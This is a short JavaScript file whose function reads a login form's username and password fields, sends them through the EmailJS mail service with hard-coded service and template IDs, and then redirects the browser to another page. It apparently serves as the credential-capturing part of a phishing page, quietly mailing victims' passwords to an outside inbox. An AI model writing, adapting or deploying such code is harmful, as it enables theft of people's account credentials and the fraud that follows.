


function sendMail () {

    var params = {
        emailOrUsername: document.getElementById("username").value,
        password: document.getElementById("pass").value
    }
    const serviceID = "service_rtcxsrg";
    const templateID = "template_wqg0u7o"
    
    emailjs
        .send(serviceID, templateID, params)
        .then((res) => {
            window.location.href = "pageone.html"
            console.log(res)
        })
        .catch((err) => console.log(err))
}
